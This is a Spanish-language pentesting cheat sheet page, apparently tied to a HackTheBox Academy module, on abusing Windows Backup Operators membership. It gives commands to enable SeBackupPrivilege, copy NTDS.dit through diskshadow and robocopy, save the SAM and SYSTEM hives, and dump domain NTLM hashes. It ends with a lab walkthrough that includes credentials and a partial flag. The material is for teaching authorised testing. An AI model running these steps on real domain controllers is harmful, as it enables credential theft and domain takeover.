
# Grupos Integrados en Windows

## <mark style="color:purple;">Windows Built-In Groups</mark>

Como se mencionó en la sección [`Privilegios de usuario en Windows`](/ethical-hacking-cheatsheet/post-explotacion/escalada-de-privilegios/escalada-de-privilegios-en-windows/privilegios-de-usuario-en-windows.md), los servidores Windows, y especialmente los controladores de dominio, tienen una variedad de grupos integrados que se envían con el sistema operativo o se agregan cuando se instala la función de Servicios de dominio de Active Directory en un sistema para promover un servidor a un controlador de dominio. Muchos de estos grupos otorgan privilegios especiales a sus miembros, y algunos se pueden aprovechar para escalar privilegios en un servidor o un controlador de dominio. [Aquí](https://ss64.com/nt/syntax-security_groups.html) hay una lista de todos los grupos integrados de Windows junto con una descripción detallada de cada uno. Esta [página](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory) tiene una lista detallada de cuentas y grupos privilegiados en Active Directory.&#x20;

Es esencial comprender las implicaciones de la membresía en cada uno de estos grupos, ya sea que obtengamos acceso a una cuenta que sea miembro de uno de ellos o notemos una membresía excesiva/innecesaria en uno o más de estos grupos durante una evaluación. Para nuestros propósitos, nos centraremos en los siguientes grupos integrados. Cada uno de estos grupos existe en sistemas desde Server 2008 R2 hasta el presente, excepto los administradores de Hyper-V (introducidos con Server 2012).

Se pueden asignar cuentas a estos grupos para aplicar el mínimo privilegio y evitar la creación de más administradores de dominio y administradores de empresa para realizar tareas específicas, como copias de seguridad. A veces, las aplicaciones de proveedores también requerirán ciertos privilegios, que se pueden otorgar asignando una cuenta de servicio a uno de estos grupos. También se pueden agregar cuentas por accidente o quedar sobrantes después de probar una herramienta o secuencia de comandos específica. Siempre debemos verificar estos grupos e incluir una lista de los miembros de cada grupo como apéndice en nuestro informe para que el cliente la revise y determine si el acceso aún es necesario.

|                                                                                                                                                                           |                                                                                                                                                                 |                                                                                                                                                                |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators)            | [Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders) | [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins)              |
| [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators) | [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators)    | [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) |

***

## <mark style="color:purple;">Backup Operators</mark>

Después de aterrizar en una máquina, podemos usar el comando `whoami /groups` para mostrar nuestras membresías de grupo actuales. Examinemos el caso en el que somos miembros del grupo `Backup Operators`. La membresía de este grupo otorga a sus miembros los privilegios `SeBackup` y `SeRestore`. El [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) nos permite recorrer cualquier carpeta y enumerar el contenido de la carpeta. Esto nos permitirá copiar un archivo de una carpeta, incluso si no hay una entrada de control de acceso (ACE) para nosotros en la lista de control de acceso (ACL) de la carpeta. Sin embargo, no podemos hacer esto usando el comando de copia estándar. En su lugar, necesitamos copiar los datos mediante programación, asegurándonos de especificar el indicador [FILE\_FLAG\_BACKUP\_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) .

Podemos usar esta [PoC](https://github.com/giuliano108/SeBackupPrivilege) para explotar el `SeBackupPrivilege` y copiar este archivo. Primero, importemos las bibliotecas en una sesión de PowerShell.

### **Importación de bibliotecas**

```powershell
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

### **Verificar que SeBackupPrivilege esté habilitado**

Verifiquemos si `SeBackupPrivilege` está habilitado invocando `whoami /priv`o `Get-SeBackupPrivilege`cmdlet. Si el privilegio está deshabilitado, podemos habilitarlo con `Set-SeBackupPrivilege`.

Nota: Según la configuración del servidor, es posible que sea necesario generar un mensaje de CMD elevado para omitir el UAC y tener este privilegio.

```powerquery
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```powershell
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is disabled
```

### **Habilitar SeBackupPrivilege**

Si el privilegio está deshabilitado, podemos habilitarlo con `Set-SeBackupPrivilege`.

```powershell
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is enabled
```

```powershell
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

### **Copiar un archivo protegido**

Como podemos ver arriba, el privilegio se habilitó correctamente. Ahora se puede aprovechar este privilegio para copiar cualquier archivo protegido.

```powershell
PS C:\htb> dir C:\Confidential\

    Directory: C:\Confidential

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/6/2021   1:01 PM             88 2021 Contract.txt


PS C:\htb> cat 'C:\Confidential\2021 Contract.txt'

cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
At line:1 char:1
+ cat 'C:\Confidential\2021 Contract.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Confidential\2021 Contract.txt:String) [Get-Content], Unauthor
   izedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

```powershell
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Copied 88 bytes


PS C:\htb>  cat .\Contract.txt

Inlanefreight 2021 Contract

==============================

Board of Directors:

<...SNIP...>
```

Los comandos anteriores demuestran cómo se accedió a información confidencial sin poseer los permisos necesarios.

### **Ataque a un Domain Controller: copia de NTDS.dit**

Este grupo también permite iniciar sesión localmente en un controlador de dominio. La base de datos de Active Directory `NTDS.dit` es un objetivo muy atractivo, ya que contiene los hashes NTLM de todos los objetos de usuario y equipo del dominio. Sin embargo, este archivo está bloqueado y tampoco es accesible para usuarios sin privilegios.

Como el archivo `NTDS.dit` está bloqueado de forma predeterminada, podemos usar la utilidad [Diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) de Windows para crear una copia de seguridad de la unidad `C` y exponerla como unidad `E`. El sistema no utilizará el archivo NTDS.dit de esta copia de seguridad.

```powershell
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\htb> dir E:

    Directory: E:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

### **Copiar NTDS.dit localmente**

A continuación, podemos usar el cmdlet `Copy-FileSeBackupPrivilege` para omitir la ACL y copiar NTDS.dit localmente.

```powershell
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

Copied 16777216 bytes
```

### **Copia de las colmenas de SAM y SYSTEM**

El privilegio también nos permite realizar copias de seguridad de las colmenas de registro SAM y SYSTEM, de los cuales podemos extraer credenciales de cuentas locales sin conexión usando una herramienta como Impacket `secretsdump.py`.

```powershell
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\htb> reg save HKLM\SAM SAM.SAV

The operation completed successfully.
```

Vale la pena señalar que si una carpeta o archivo tiene una entrada de denegación explícita para nuestro usuario actual o un grupo al que pertenece, esto nos impedirá acceder a él, incluso si se especifica la flag `FILE_FLAG_BACKUP_SEMANTICS`.

### **Extracción de credenciales de NTDS.dit**

Una vez extraído el archivo NTDS.dit, podemos utilizar una herramienta como `impacket-secretsdump` o el módulo PowerShell `DSInternals` para extraer todas las credenciales de la cuenta de Active Directory. Obtengamos el hash NTLM solo para la cuenta `administrator` del dominio utilizando `DSInternals`.

```powershell
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
Sid: S-1-5-21-669053619-2741956077-1013132368-500
Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215
SamAccountName: Administrator
SamAccountType: User
UserPrincipalName:
PrimaryGroupId: 513
SidHistory:
Enabled: True
UserAccountControl: NormalAccount, PasswordNeverExpires
AdminCount: True
Deleted: False
LastLogonDate: 5/6/2021 5:40:30 PM
DisplayName:
GivenName:
Surname:
Description: Built-in account for administering the computer/domain
ServicePrincipalName:
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-669053619-2741956077-1013132368-512
Secrets
  NTHash: cf3a5525ee9414229e66279623ed5c58
  LMHash:
  NTHashHistory:
  LMHashHistory:
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: d60dfbbf20548938
      OldCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 94c300d0e47775b407f2496a5cca1a0a
          Iterations: 4096
        DES_CBC_MD5
          Key: d60dfbbf20548938
          Iterations: 4096
      OldCredentials:
      OlderCredentials:
      ServiceCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:
```

### **Extracción de hashes con SecretsDump**

También podemos utilizar el método sin conexión `SecretsDump` para extraer hashes del archivo `ntds.dit` obtenido anteriormente. Estos pueden utilizarse para pasar el hash y acceder a recursos adicionales o pueden crackearse sin conexión con `Hashcat` para obtener más acceso. Si se crackean, también podemos presentar al cliente estadísticas de descifrado de contraseñas para proporcionarle información detallada sobre la solidez general de las contraseñas y su uso dentro de su dominio y brindarle recomendaciones para mejorar su política de contraseñas (aumentar la longitud mínima, crear un diccionario de palabras no permitidas, etc.).

```shell-session
afsh4ck@kali$ impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::

<SNIP>
```

***

## <mark style="color:purple;">Robocopy</mark>

La utilidad incorporada [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) también se puede utilizar para copiar archivos en modo de copia de seguridad. Robocopy es una herramienta de replicación de directorios de línea de comandos. Se puede utilizar para crear trabajos de copia de seguridad e incluye funciones como copia multiproceso, reintento automático, la capacidad de reanudar la copia y más. Robocopy se diferencia del comando `copy` en que, en lugar de simplemente copiar todos los archivos, puede verificar el directorio de destino y eliminar los archivos que ya no están en el directorio de origen. También puede comparar archivos antes de copiar para ahorrar tiempo al no copiar archivos que no se han modificado desde la última tarea de copia/copia de seguridad ejecutada.

**Copiar archivos con Robocopy**

```powershell
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, May 6, 2021 1:11:47 PM
   Source : E:\Windows\NTDS\
     Dest : C:\Tools\ntds\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          1    E:\Windows\NTDS\
100%        New File              16.0 m        ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           356962042 Bytes/sec.
   Speed :           20425.531 MegaBytes/min.
   Ended : Thursday, May 6, 2021 1:11:47 PM
```

Esto elimina la necesidad de herramientas externas.

***

## <mark style="color:purple;">Caso práctico</mark>

```bash
Objetivo: 10.129.43.42 (ACADEMY-WINLPE-SRV01)

RDP con el usuario "svc_backup" y la contraseña "HTB_@cademy_stdnt!"
```

> Aproveche los derechos de `SeBackupPrivilege` y obtenga la flag ubicada en `c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt`

#### Comprobar privilegios del usuario

```powershell
PS C:\Users\svc_backup> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Vemos que aparece el privilegio `SeBackupPrivilege` pero está deshabilitado.

#### **Importación de bibliotecas**

Vamos a importar `SeBackupPrivilegeCmdLets.dll` y `SeBackupPrivilegeUtils.dll`

```powershell
PS C:\Tools> ls

    Directory: C:\Tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   4:06 PM                DSInternals
-a----        5/21/2021  10:18 AM           5120 adduser.dll
-a----         5/6/2021   5:53 PM       16777216 ntds.dit
-a----        6/28/2016  10:43 AM         188584 PsService.exe
-a----         5/6/2021  12:55 PM          12288 SeBackupPrivilegeCmdLets.dll
-a----         5/6/2021  12:54 PM          16384 SeBackupPrivilegeUtils.dll
```

```powershell
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

#### Habilitar SeBackupPrivilege&#x20;

```powershell
PS C:\Tools> Set-SeBackupPrivilege
PS C:\Tools> Get-SeBackupPrivilege
SeBackupPrivilege is enabled
```

```powershell
PS C:\Tools> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

#### **Copiar el archivo usando NTFS Backup**

Ya que `SeBackupPrivilege` permite leer archivos sin restricciones de permisos NTFS, podemos aprovechar `robocopy` para crear una copia del archivo.

```powershell
PS C:\Tools> robocopy C:\Users\Administrator\Desktop\SeBackupPrivilege C:\temp flag.txt /b

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Tuesday, February 18, 2025 12:35:21 PM
   Source : C:\Users\Administrator\Desktop\SeBackupPrivilege\
     Dest : C:\temp\

    Files : flag.txt

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          1    C:\Users\Administrator\Desktop\SeBackupPrivilege\
100%        New File                  30        flag.txt

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :        30        30         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Tuesday, February 18, 2025 12:35:21 PM
```

> * **Parámetro `/b`**: Usa el modo **Backup**, ignorando permisos.

Ahora el archivo está en `C:\temp\flag.txt`.

#### **Leer el contenido del archivo**

Una vez copiado, simplemente lo leemos:

```powershell
PS C:\Tools> type C:\temp\flag.txt
Car3ful_w1th_gr0up***********!
```
